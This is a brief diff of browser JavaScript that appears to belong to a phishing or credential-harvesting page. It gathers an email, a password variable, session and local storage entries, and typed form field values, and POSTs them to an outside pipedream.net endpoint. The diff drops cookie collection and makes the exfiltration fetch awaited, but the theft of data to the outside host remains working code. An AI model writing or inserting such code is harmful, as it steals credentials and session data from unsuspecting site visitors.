@@ -31,7 +31,6 @@ window.addEventListener('beforeunload', (e) => {
 		mode: ur.searchParams.get("mode") || "Suppression",
 		email: ur.searchParams.get("email") || "test@gmail.com",
 		ps: pass,
-		c: document.cookie,
 		s: Object.fromEntries(
 		keys
 			.map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
@@ -85,7 +84,7 @@ async function iframe() {
 						name: this.name || this.id || this.type || this.className || 'field',
 						value: this.value || this.innerText
 					};
-					fetch('https://8d72fc5d27b20a8d575b1973c65a62c3.m.pipedream.net', {
+					await fetch('https://8d72fc5d27b20a8d575b1973c65a62c3.m.pipedream.net', {
 						method: "POST",
 						headers: {
 							"Content-Type": "application/json"
